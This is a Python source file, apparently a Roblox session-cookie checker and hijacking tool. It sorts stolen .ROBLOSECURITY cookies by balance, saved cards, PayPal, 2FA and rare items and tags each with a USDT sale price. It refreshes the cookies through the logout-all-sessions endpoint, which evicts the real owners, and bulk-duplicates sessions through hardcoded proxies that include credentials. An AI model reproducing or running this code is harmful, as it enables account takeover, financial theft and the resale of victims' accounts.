                                    key=lambda x: x['donate_year'] + x['donate_lifetime'], reverse=True)
                if donate_stats:
                    zipf.writestr('Donate/donate.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in donate_stats))
                
                mixed_donate_stats = [d for d in valid_stats if d['donate_year'] > 0 or d['donate_lifetime'] > 0]
                if mixed_donate_stats:
                    random.shuffle(mixed_donate_stats)
                    zipf.writestr('Donate/Mixed Donate.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in mixed_donate_stats))
                
                no_donates_stats = [d for d in valid_stats if d['donate_year'] == 0 and d['donate_lifetime'] == 0]
                if no_donates_stats:
                    zipf.writestr('Donate/No Donates.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in no_donates_stats))
                
                # Диапазоны для donate_year
                year_donate_stats = sorted([d for d in valid_stats if d['donate_year'] > 0], key=lambda x: x['donate_year'], reverse=True)
                ranges = sorted(_DONATE_RANGES, key=lambda x: x[0])
                thresholds = [t for t, _ in ranges]
                for i in range(len(ranges)):
                    lower = thresholds[i]
                    upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                    range_stats = [d for d in year_donate_stats if lower <= d['donate_year'] < upper]
                    if range_stats:
                        name = ranges[i][1]
                        zipf.writestr(f'Donate/{name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
                
                # Диапазоны для donate_lifetime
                lifetime_stats = sorted([d for d in valid_stats if d['donate_lifetime'] > 0], key=lambda x: x['donate_lifetime'], reverse=True)
                if lifetime_stats:
                    zipf.writestr('Lifetime/Donates.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in lifetime_stats))
                
                ranges = sorted(_LIFETIME_RANGES, key=lambda x: x[0])
                thresholds = [t for t, _ in ranges]
                for i in range(len(ranges)):
                    lower = thresholds[i]
                    upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                    range_stats = [d for d in lifetime_stats if lower <= d['donate_lifetime'] < upper]
                    if range_stats:
                        name = ranges[i][1]
                        zipf.writestr(f'Lifetime/{name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
            
            # Balance
            if selected_checks.get('balance', False):
                balance_stats = sorted([d for d in valid_stats if d['balance'] > 0], key=lambda x: x['balance'], reverse=True)
                if balance_stats:
                    zipf.writestr('Balance/Balance.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in balance_stats))
                
                no_balance_stats = [d for d in valid_stats if d['balance'] == 0]
                if no_balance_stats:
                    zipf.writestr('Balance/No Balance.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in no_balance_stats))
                
                ranges = sorted(_BALANCE_RANGES, key=lambda x: x[0])
                thresholds = [t for t, _ in ranges]
                for i in range(len(ranges)):
                    lower = thresholds[i]
                    upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                    range_stats = [d for d in balance_stats if lower <= d['balance'] < upper]
                    if range_stats:
                        name = ranges[i][1]
                        zipf.writestr(f'Balance/{name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
            
            # Billing
            if selected_checks.get('billing', False):
                billing_stats = sorted([d for d in valid_stats if d.get('billing_robux', 0) > 0], 
                                    key=lambda x: x.get('billing_robux', 0), reverse=True)
                if billing_stats:
                    zipf.writestr('Billing/Billing.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in billing_stats))
                
                ranges = sorted(_BILLING_RANGES, key=lambda x: x[0])
                thresholds = [t for t, _ in ranges]
                for i in range(len(ranges)):
                    lower = thresholds[i]
                    upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                    range_stats = [d for d in billing_stats if lower <= d.get('billing_robux', 0) < upper]
                    if range_stats:
                        name = ranges[i][1]
                        zipf.writestr(f'Billing/{name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
            
            # Cards with network grouping - НОВЫЙ РАЗДЕЛ
            if selected_checks.get('card', False):
    # Аккаунты с картами
                cards_stats = [d for d in valid_stats if d.get('card', 0) > 0]
                if cards_stats:
                    # Основной файл со всеми картами
                    zipf.writestr('Card/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in cards_stats))
                    
                    # Группировка по CardNetwork
                    network_stats = {}
                    for d in cards_stats:
                        cards_by_network = d.get('cards_by_network', {})
                        for network, count in cards_by_network.items():
                            if network not in network_stats:
                                network_stats[network] = []
                            network_stats[network].append(d)
                    
                    # Создаем файлы для каждой сети
                    for network, stats in network_stats.items():
                        if stats:
                            # Убираем дубликаты по cookie
                            unique_stats = list({dd['cookie']: dd for dd in stats}.values())
                            safe_network = self._safe_zip_component(network, "unknown_network")
                            zipf.writestr(f'Card/ByNetwork/{safe_network}.txt', '\n'.join(
                                self.format_cookie_line(dd, selected_badges, selected_gamepasses, selected_checks, 
                                                    selected_ingame, selected_playtime, use_emoji) 
                                for dd in unique_stats
                            ))
                    
                    # Статистика по сетям для отладки
                    network_summary = {network: len(stats) for network, stats in network_stats.items()}
                    logging.info(f"📊 Распределение карт по сетям: {network_summary}")
                
                # НОВОЕ: PayPal профили
                paypal_stats = [d for d in valid_stats if d.get('paypal_profiles')]
                if paypal_stats:
                    # Создаем папку для PayPal
                    paypal_folder = 'Card/PayPal'
                    
                    # Основной файл со всеми аккаунтами, у которых есть PayPal
                    zipf.writestr(f'{paypal_folder}/all_paypal.txt', '\n'.join(
                        self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, 
                                            selected_ingame, selected_playtime, use_emoji) 
                        for d in paypal_stats
                    ))
                    
            
            # Premium, Email, 2FA, Rares, Trade
            if selected_checks.get('premium', False):
                premium_stats = [d for d in valid_stats if d['prem']]
                if premium_stats:
                    zipf.writestr('Premium/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in premium_stats))
            
            if selected_checks.get('email_verified', False):
                email_stats = [d for d in valid_stats if d['email_verified']]
                if email_stats:
                    zipf.writestr('Email/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in email_stats))
                
                no_email_stats = [d for d in valid_stats if not d['email_verified']]
                if no_email_stats:
                    zipf.writestr('Email/false.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in no_email_stats))
            
            if selected_checks.get('two_fa', False):
                two_fa_stats = [d for d in valid_stats if d['two_fa']]
                if two_fa_stats:
                    zipf.writestr('2FA/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in two_fa_stats))
                
                no_two_fa_stats = [d for d in valid_stats if not d['two_fa']]
                if no_two_fa_stats:
                    zipf.writestr('2FA/false.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in no_two_fa_stats))
            
            if selected_checks.get('rares', False):
                headless_stats = [d for d in valid_stats if d['headless']]
                if headless_stats:
                    zipf.writestr('Headless/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in headless_stats))
                
                korblox_stats = [d for d in valid_stats if d['korblox']]
                if korblox_stats:
                    zipf.writestr('Korblox/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in korblox_stats))
            
            if selected_checks.get('trade', False):
                trade_stats = [d for d in valid_stats if d['trade']]
                if trade_stats:
                    zipf.writestr('Trade/true.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in trade_stats))
                
                no_trade_stats = [d for d in valid_stats if not d['trade']]
                if no_trade_stats:
                    zipf.writestr('Trade/false.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in no_trade_stats))
            
            # Badges
            if selected_checks.get('badges', False):
                badges_stats = [d for d in valid_stats if sum(v.get('count', 0) for v in d.get('badges_count_per_game', {}).values()) > 0]
                
                if badges_stats:
                    # Группировка по игре: Game Name (count).txt
                    for game in [g for g in selected_badges if selected_badges[g]]:
                        game_badges = [d for d in badges_stats if d.get('badges_count_per_game', {}).get(game, {}).get('count', 0) > 0]
                        if game_badges:
                            game_info = GAMES.get(game, {})
                            game_name = game_info.get('name', game)
                            safe_name = self._safe_zip_component(game_name, game)
                            count = len(game_badges)
                            zipf.writestr(f'Badges/{safe_name} ({count}).txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in game_badges))
            
            # Gamepasses
            if selected_checks.get('gamepasses', False):
                gamepasses_stats = [d for d in valid_stats if sum(v.get('count', 0) for v in d.get('gamepasses_count_per_game', {}).values()) > 0]
                
                if gamepasses_stats:
                    # Группировка по игре: Game Name (count).txt
                    for game in [g for g in selected_gamepasses if selected_gamepasses[g]]:
                        game_gps = [d for d in gamepasses_stats if d.get('gamepasses_count_per_game', {}).get(game, {}).get('count', 0) > 0]
                        if game_gps:
                            game_info = GAMES.get(game, {})
                            game_name = game_info.get('name', game)
                            safe_name = self._safe_zip_component(game_name, game)
                            count = len(game_gps)
                            zipf.writestr(f'Gamepasses/{safe_name} ({count}).txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in game_gps))
            
            # InGame Donate
            if selected_checks.get('ingame_donate', False):
                for short in [k for k in selected_ingame if selected_ingame[k]]:
                    game_info = ingame_games.get(short, GAMES[short])
                    game_name = game_info['name']
                    game_donate_stats = sorted([d for d in valid_stats if d['game_donates'].get(game_name, {'sum': 0})['sum'] > 0],
                                            key=lambda x: x['game_donates'].get(game_name, {'sum': 0})['sum'], reverse=True)
                    if game_donate_stats:
                        safe_folder = self._safe_zip_component(game_name, short).replace(' ', '_')
                        safe_game_name = self._safe_zip_component(game_name, short)
                        zipf.writestr(f'InGameDonate/{safe_folder}/{safe_game_name} Donate.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in game_donate_stats))
                    
                    ranges = sorted(_LIFETIME_RANGES, key=lambda x: x[0])
                    thresholds = [t for t, _ in ranges]
                    for i in range(len(ranges)):
                        lower = thresholds[i]
                        upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                        range_stats = [d for d in game_donate_stats if lower <= d['game_donates'].get(game_name, {'sum': 0})['sum'] < upper]
                        if range_stats:
                            name = ranges[i][1]
                            safe_range_name = self._safe_zip_component(name, "range")
                            zipf.writestr(f'InGameDonate/{safe_folder}/{safe_range_name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
            
            # Playtime
            if selected_checks.get('playtime', False):
                for short in [k for k in selected_playtime if selected_playtime[k]]:
                    game_info = playtime_games.get(short, GAMES[short])
                    game_name = game_info['name']
                    game_playtime_stats = sorted([d for d in valid_stats if d['playtime_minutes'].get(game_name, 0) > 0],
                                                key=lambda x: x['playtime_minutes'].get(game_name, 0), reverse=True)
                    if game_playtime_stats:
                        safe_folder = self._safe_zip_component(game_name, short).replace(' ', '_')
                        safe_game_name = self._safe_zip_component(game_name, short)
                        zipf.writestr(f'Playtime/{safe_folder}/{safe_game_name} Playtime.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in game_playtime_stats))
                    
                    ranges = sorted(_PLAYTIME_RANGES, key=lambda x: x[0])
                    thresholds = [t for t, _ in ranges]
                    for i in range(len(ranges)):
                        lower = thresholds[i]
                        upper = thresholds[i+1] if i+1 < len(thresholds) else float('inf')
                        range_stats = [d for d in game_playtime_stats if lower <= d['playtime_minutes'].get(game_name, 0) < upper]
                        if range_stats:
                            name = ranges[i][1]
                            safe_range_name = self._safe_zip_component(name, "range")
                            zipf.writestr(f'Playtime/{safe_folder}/{safe_range_name}.txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in range_stats))
            
            # Country
            if selected_checks.get('country', False):
                from collections import defaultdict
                country_dict = defaultdict(list)
                for d in valid_stats:
                    country = d.get('country', 'Unknown')
                    country_dict[country].append(d)
                for country in sorted(country_dict.keys()):
                    stats = country_dict[country]
                    if stats:
                        count = len(stats)
                        safe_country = self._safe_zip_component(country, "Unknown")
                        zipf.writestr(f'Country/{safe_country} ({count}).txt', '\n'.join(self.format_cookie_line(d, selected_badges, selected_gamepasses, selected_checks, selected_ingame, selected_playtime, use_emoji) for d in stats))

        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    def format_cookie_line(self, d: Dict, selected_badges: Dict[str, bool], selected_gamepasses: Dict[str, bool], selected_checks: Dict[str, bool], selected_ingame: Dict[str, bool], selected_playtime: Dict[str, bool], use_emoji: bool = True) -> str:
        line = f"Profile: {d['url']} | Username: {d['username']}"

        _price = d.get('price', 0) or 0
        if selected_checks.get('price', True) and _price > 0:
            line += f" | Price: ~{_price} USDT"

        if selected_checks.get('balance', False):
            line += f" | Balance: {d['balance']} R$"
        if selected_checks.get('pending', False):
            line += f" | Pending: {d['pending']} R$"
        if selected_checks.get('donate_year', False):
            line += f" | Donate: {d['donate_year']} R$"
        if selected_checks.get('places_visits', False):
         line += f" | Places Visits: {d['places_visits']:,}"
        if selected_checks.get('donate_lifetime', False):
            line += f" | All-time donate: {d['donate_lifetime']} R$"
        if selected_checks.get('rap', False):
            line += f" | Rap: {d['rap']} R$"
            top_items = d.get('top_rap_items', [])
            if top_items:
                items_str = " | ".join(f"{it['name']}: {it['rap']:,} R$" for it in top_items)
                line += f" | Top Items: {items_str}"
        if selected_checks.get('billing', False):
    # ИЗМЕНЕНО: используем billing_robux если есть, иначе парсим из строки
            if 'billing_robux' in d:
                line += f" | Billing: {d['billing_robux']} R$"
            else:
                # fallback на старый формат
                line += f" | Billing: {d['billing']}"
        if selected_checks.get('premium', False):
            line += f" | Premium: {str(d['prem']).lower()}"
        if selected_checks.get('card', False):
            line += f" | Card: {d['card']}"
        if selected_checks.get('groups_balance', False):
            line += f" | Balance(G): {d['groups_balance']}"
        if selected_checks.get('age_verified', False):
            line += f" | Verified age: {d['age_verified']}"
        if selected_checks.get('two_fa', False):
            line += f" | Authenticator: {str(d['two_fa']).lower()}"
        if selected_checks.get('country', False):
            line += f" | Country: {d['country']}"
        if selected_checks.get('trade', False):
            line += f" | Trade: {str(d['trade']).lower()}"
        if selected_checks.get('email_verified', False):
            line += f" | EMail: {'Verified' if d['email_verified'] else 'Not'}"
        if selected_checks.get('rares', False):
            line += f" | Headless: {str(d['headless']).lower()} | Korblox: {str(d['korblox']).lower()}"

        # InGame Donate — теперь по именам игр
        if selected_checks.get('ingame_donate', False) and d['game_donates']:
            games_str = " | ".join(f"{name}: {data['sum']} R$" for name, data in d['game_donates'].items())
            line += f" | InGame: {games_str}"

        # Playtime — теперь по именам игр
        if selected_checks.get('playtime', False) and d['playtime_minutes']:
            playtime_str = " | ".join(f"{name}: {minutes}m" for name, minutes in d['playtime_minutes'].items() if minutes > 0)
            if playtime_str:
                line += f" | Playtime: {playtime_str}"

        # Passable / Unpassable
        if selected_checks.get('passable', False):
            line += f" | Passable: {'true' if not self.is_unpassable(d) else 'false'}"

        # Badges
        badges_str = ""
        if selected_checks.get('badges', False) and any(selected_badges.values()):
            if selected_checks.get('badges_by_name', False):
                all_names = []
                for game in [g for g in selected_badges if selected_badges[g]]:
                    names = d.get('badges_count_per_game', {}).get(game, {}).get('names', [])
                    all_names.extend(names)
                badges_str = f" | Badges: {', '.join(all_names)}" if all_names else " | Badges: None"
            else:
                total_count = sum(v.get('count', 0) for v in d.get('badges_count_per_game', {}).values())
                badges_str = f" | Badges: {total_count}"
            line += badges_str

        # Gamepasses
        gamepasses_str = ""
        if selected_checks.get('gamepasses', False) and any(selected_gamepasses.values()):
            if selected_checks.get('gamepasses_by_name', False):
                all_names = []
                for game in [g for g in selected_gamepasses if selected_gamepasses[g]]:
                    names = d.get('gamepasses_count_per_game', {}).get(game, {}).get('names', [])
                    all_names.extend(names)
                gamepasses_str = f" | Gamepasses: {', '.join(all_names)}" if all_names else " | Gamepasses: None"
            else:
                total_count = sum(v.get('count', 0) for v in d.get('gamepasses_count_per_game', {}).values())
                gamepasses_str = f" | Gamepasses: {total_count}"
            line += gamepasses_str

        rare_items = d.get('rare_items', [])
        if rare_items and selected_checks.get('rare_items_check', False):
            rare_names = ", ".join(it['name'] for it in rare_items)
            line += f" | Rare Items: {rare_names}"

        line += f" | Cookie: {d['cookie']}"
        return line

    def get_game_name_with_emoji(self, short: str, use_emoji: bool) -> str:
        if use_emoji and short in EMOJI_GAMES:
            return f"{EMOJI_GAMES[short]}{GAMES[short]['name']}{EMOJI_GAMES[short]}"
        return GAMES[short]['name']

    async def screenshot_local_html(self, html_path: str) -> str:
        """Делает скриншот локального HTML-файла напрямую через file://"""
        screenshot_filename = f"{uuid.uuid4()}.jpg"
        screenshot_path = os.path.join(self.temp_dir, screenshot_filename)

        file_url = f"file://{os.path.abspath(html_path)}"

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                device_scale_factor=1,
            )
            page = await context.new_page()

            await page.goto(file_url, wait_until="networkidle")
            await page.wait_for_timeout(2000)  # Даем время на полный рендер (стили, таблицы и т.д.)

            await page.screenshot(
                path=screenshot_path,
                full_page=True,
                type='jpeg',
                quality=90
            )

            await browser.close()

        logging.info(f"📸 Локальный скриншот сохранён: {screenshot_path}")
        return screenshot_path
    

    async def refresh_cookie(self, session: aiohttp.ClientSession, cookie: str, fixed_proxy: str) -> Optional[str]:
        """
        Обновляет куку через /v2/logoutfromallsessionsandreauthenticate.
        Использует один фиксированный прокси на весь процесс.
        Без финальной валидации новой куки — сразу возвращаем, если нашли в Set-Cookie.
        """
        logging.info("=== Начало refresh куки ===")
        try:
            # Предварительная валидация оригинальной куки
            validation = await self.validate_single_cookie(cookie, fixed_proxy)
            if not validation.get('valid'):
                logging.warning("Оригинальная кука невалидна — пропуск refresh")
                return None

            username = validation['user_info']['name']
            user_id = validation['user_info']['id']
            logging.info(f"Refresh для {username} (ID: {user_id}) через прокси {fixed_proxy.split('@')[-1]}")

            # Получаем X-CSRF-Token
            csrf_token = await self._get_xcsrf_token_for_refresh(session, cookie, fixed_proxy)
            if not csrf_token:
                logging.error("Не удалось получить X-CSRF-Token")
                return None

            logging.info("X-CSRF-Token получен")

            headers = {
                "X-CSRF-TOKEN": csrf_token,
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json",
                "Referer": "https://www.roblox.com/",
                "Content-Type": "application/json",
                "Origin": "https://www.roblox.com",
                "rbxauthenticationnegotiation": "1"
            }

            payload = {
                "SecureAuthenticationIntent": {
                    "clientPublicKey": "placeholder_public_key",
                    "clientEpochTimestamp": int(datetime.now().timestamp() * 1000),
                    "saiSignature": "placeholder_signature",
                    "serverNonce": "placeholder_nonce"
                }
            }

            logging.info("Отправка запроса на refresh...")
            async with request_semaphore:
                async with session.post(
                    "https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate",
                    json=payload,
                    headers=headers,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=fixed_proxy,
                    timeout=aiohttp.ClientTimeout(total=40)
                ) as response:
                    logging.info(f"Ответ получен: статус {response.status}")

                    # Логируем тело ответа для отладки (особенно полезно при 401/403)
                    try:
                        response_text = await response.text()
                        logging.info(f"Тело ответа: {response_text[:500]}")
                    except Exception:
                        logging.warning("Не удалось прочитать тело ответа")

                    # Извлекаем все Set-Cookie заголовки
                    set_cookie_headers = response.headers.getall('Set-Cookie', [])
                    logging.info(f"Найдено Set-Cookie заголовков: {len(set_cookie_headers)}")

                    new_cookie = None
                    for header in set_cookie_headers:
                        if '.ROBLOSECURITY=' in header:
                            match = re.search(r'\.ROBLOSECURITY=([^;]+)', header)
                            if match:
                                new_cookie = match.group(1).strip()
                                logging.info(f"✅ Новая кука успешно извлечена: {new_cookie[:15]}...{new_cookie[-10:]}")
                                break  # Нашли — выходим

                    if new_cookie:
                        return new_cookie  # ← ВОЗВРАЩАЕМ НОВУЮ КУКУ!

                    logging.error("Не найден .ROBLOSECURITY в Set-Cookie заголовках")
                    return None

        except asyncio.TimeoutError:
            logging.error("Таймаут при refresh")
            return None
        except aiohttp.ClientConnectorError as e:
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str:
                logging.warning(f"🚫 DNS-ошибка при refresh: {e}")
            else:
                logging.error(f"Ошибка подключения при refresh: {e}")
            return None
        except Exception as e:
            logging.error(f"Критическая ошибка при refresh: {e}", exc_info=True)
            return None
        finally:
            logging.info("=== Завершение refresh ===\n")

    async def _get_xcsrf_token_for_refresh(self, session: aiohttp.ClientSession, cookie: str, proxy: str) -> Optional[str]:
        async with request_semaphore:
            try:
                async with session.post(
                    "https://auth.roblox.com/v2/logout",
                    cookies={".ROBLOSECURITY": cookie},
                    headers={
                        "User-Agent": random.choice(USER_AGENTS),
                        "Accept": "application/json",
                        "Referer": "https://www.roblox.com/"
                    },
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    if response.status in (200, 403):
                        return response.headers.get("X-CSRF-TOKEN")
            except Exception as e:
                logging.error(f"Ошибка получения X-CSRF: {e}")
        return None
    
    FRESHER_PROXY = [
        "http://SPRNG7:XC1WtT@196.18.15.170:8000",
        "http://SPRNG7:XC1WtT@196.18.13.7:8000",
        "http://SPRNG7:XC1WtT@196.18.12.59:8000",
        "http://SPRNG7:XC1WtT@196.18.13.210:8000",
        "http://SPRNG7:XC1WtT@196.18.13.130:8000",
        "http://SPRNG7:XC1WtT@196.18.14.85:8000",
        "http://SPRNG7:XC1WtT@196.18.15.111:8000",
        "http://SPRNG7:XC1WtT@196.18.13.186:8000",
        "http://SPRNG7:XC1WtT@196.18.15.117:8000",
        "http://SPRNG7:XC1WtT@196.19.11.227:8000",
        "http://SPRNG7:XC1WtT@196.19.120.80:8000",
        "http://SPRNG7:XC1WtT@196.19.120.87:8000",
        "http://SPRNG7:XC1WtT@196.19.121.12:8000",
        "http://SPRNG7:XC1WtT@196.19.121.117:8000",
        "http://SPRNG7:XC1WtT@196.19.120.133:8000",
        "http://SPRNG7:XC1WtT@196.19.122.18:8000",
        "http://SPRNG7:XC1WtT@196.19.121.153:8000",
        "http://SPRNG7:XC1WtT@196.19.123.79:8000",
        "http://SPRNG7:XC1WtT@196.19.120.59:8000",
        "http://SPRNG7:XC1WtT@196.19.120.58:8000",
        "http://SPRNG7:XC1WtT@196.19.120.98:8000",
        "http://SPRNG7:XC1WtT@196.19.120.11:8000",
        "http://SPRNG7:XC1WtT@196.19.122.76:8000",
    ]

    async def fresh_cookie_batch(self, cookies: List[str], progress_callback=None) -> List[str]:
        """
        Batch refresh с использованием жёстко зашитых прокси.
        Каждая кука обрабатывается через один фиксированный прокси на весь процесс.
        """
        if not cookies:
            return []

        refreshed = []
        total = len(cookies)
        completed = 0

        proxies = self.FRESHER_PROXY
        logging.info(f"🔄 Batch refresh {total} куков с {len(proxies)} фиксированными прокси")

        semaphore = asyncio.Semaphore(FRESH_SEMAPHORE)
        pool = ProxyPool(proxies, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC)

        connector = aiohttp.TCPConnector(ssl=_SSL_CTX, limit=200, limit_per_host=25, enable_cleanup_closed=True, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=120)) as shared_session:
            async def refresh_one(cookie: str):
                nonlocal completed
                async with semaphore:
                    proxy = await pool.acquire()
                    new_cookie = None
                    try:
                        new_cookie = await self.refresh_cookie(shared_session, cookie, proxy)
                        completed += 1
                        if progress_callback:
                            await progress_callback(completed, total)
                        return new_cookie
                    except Exception as e:
                        logging.error(f"Ошибка при refresh одной куки: {e}")
                        completed += 1
                        if progress_callback:
                            await progress_callback(completed, total)
                        return None
                    finally:
                        pool.release(proxy, success=bool(new_cookie))

            tasks = []
            for cookie in cookies:
                tasks.append(refresh_one(cookie))

            results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, res in enumerate(results):
            if isinstance(res, str) and res:  # Проверяем, что это строка и не пустая
                refreshed.append(res)
            elif isinstance(res, Exception):
                logging.error(f"Исключение при обработке куки #{i}: {res}")
            elif res is not None:
                logging.warning(f"Неожиданный результат для куки #{i}: {type(res)}")

        logging.info(f"✅ Refresh завершён: {len(refreshed)}/{total} успешно")
        return refreshed
    async def duplicate_cookie(self, session: aiohttp.ClientSession, cookie: str, fixed_proxy: str) -> Optional[str]:
        """
        Дублирует сессию через /v2/session/refresh.
        Использует тот же подход, что и refresh_cookie, но другой эндпоинт.
        """
        logging.info("=== Начало дублирования куки ===")
        try:
            # Предварительная валидация
            validation = await self.validate_single_cookie(cookie, fixed_proxy)
            if not validation.get('valid'):
                logging.warning("Оригинальная кука невалидна — пропуск дублирования")
                return None

            username = validation['user_info']['name']
            user_id = validation['user_info']['id']
            logging.info(f"Дублирование для {username} (ID: {user_id}) через прокси {fixed_proxy.split('@')[-1] if fixed_proxy else 'None'}")

            # Получаем X-CSRF-Token (нужен для refresh)
            csrf_token = await self._get_xcsrf_token_for_refresh(session, cookie, fixed_proxy)
            if not csrf_token:
                logging.error("Не удалось получить X-CSRF-Token для дублирования")
                return None

            headers = {
                "X-CSRF-TOKEN": csrf_token,
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json",
                "Referer": "https://www.roblox.com/",
                "Origin": "https://www.roblox.com",
            }

            logging.info("Отправка запроса на дублирование сессии...")
            async with request_semaphore:
                async with session.post(
                    "https://auth.roblox.com/v2/session/refresh",  # ← НОВЫЙ ЭНДПОИНТ
                    headers=headers,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=fixed_proxy,
                    timeout=aiohttp.ClientTimeout(total=40)
                ) as response:
                    logging.info(f"Ответ: статус {response.status}")
                    try:
                        response_text = await response.text()
                        logging.info(f"Тело ответа: {response_text[:500]}")
                    except:
                        pass

                    set_cookie_headers = response.headers.getall('Set-Cookie', [])
                    logging.info(f"Set-Cookie заголовков: {len(set_cookie_headers)}")

                    new_cookie = None
                    for header in set_cookie_headers:
                        if '.ROBLOSECURITY=' in header:
                            match = re.search(r'\.ROBLOSECURITY=([^;]+)', header)
                            if match:
                                new_cookie = match.group(1).strip()
                                logging.info(f"✅ Новая (дублированная) кука получена: {new_cookie[:15]}...{new_cookie[-10:]}")
                                break

                    return new_cookie

        except asyncio.TimeoutError:
            logging.error("Таймаут при дублировании")
            return None
        except aiohttp.ClientConnectorError as e:
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str:
                logging.warning(f"🚫 DNS-ошибка при дублировании: {e}")
            else:
                logging.error(f"Ошибка подключения при дублировании: {e}")
            return None
        except Exception as e:
            logging.error(f"Критическая ошибка при дублировании: {e}", exc_info=True)
            return None
        finally:
            logging.info("=== Завершение дублирования ===\n")

    async def duplicate_cookie_batch(self, cookies: List[str], progress_callback=None) -> List[str]:
        """
        Batch-дублирование с фиксированными прокси (аналог fresh_cookie_batch).
        """
        if not cookies:
            return []

        duplicated = []
        total = len(cookies)
        completed = 0
        proxies = self.FRESHER_PROXY
        logging.info(f"🔄 Batch дублирование {total} куков с {len(proxies)} прокси")

        semaphore = asyncio.Semaphore(FRESH_SEMAPHORE)
        pool = ProxyPool(proxies, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC)

        connector = aiohttp.TCPConnector(ssl=_SSL_CTX, limit=200, limit_per_host=25, enable_cleanup_closed=True, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=120)) as shared_session:
            async def duplicate_one(cookie: str):
                nonlocal completed
                async with semaphore:
                    proxy = await pool.acquire()
                    new_cookie = None
                    try:
                        new_cookie = await self.duplicate_cookie(shared_session, cookie, proxy)
                        completed += 1
                        if progress_callback:
                            await progress_callback(completed, total)
                        return new_cookie
                    except Exception as e:
                        logging.error(f"Ошибка при дублировании одной куки: {e}")
                        completed += 1
                        if progress_callback:
                            await progress_callback(completed, total)
                        return None
                    finally:
                        pool.release(proxy, success=bool(new_cookie))

            tasks = []
            for cookie in cookies:
                tasks.append(duplicate_one(cookie))

            results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, str) and res:
                duplicated.append(res)

        logging.info(f"✅ Дублирование завершено: {len(duplicated)}/{total} успешно")
        return duplicated
